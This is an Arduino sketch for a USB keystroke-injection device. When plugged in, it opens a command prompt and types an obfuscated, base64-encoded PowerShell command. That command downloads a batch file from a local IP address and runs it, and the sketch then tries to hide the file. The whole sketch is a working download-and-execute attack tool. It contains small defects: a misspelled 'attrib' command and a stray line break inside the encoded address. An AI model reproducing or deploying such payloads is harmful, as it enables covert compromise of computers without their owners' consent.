#include <NinjaKeyboard.h>

EthicNinjaKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  en.winRUN("cmd.exe");
  en.echoEnter("powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAKADIALgAxAC8AYQAuAHQAeAB0ACcALAAnAGEALgBiAGEAdAAnACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJwBhAC4AYgBhAHQAJwA=");
  en.sleep(5);
  en.echoEnter("attrub +s +h a.bat");
  en.echoEnter("exit");
}

void loop() {
  
}
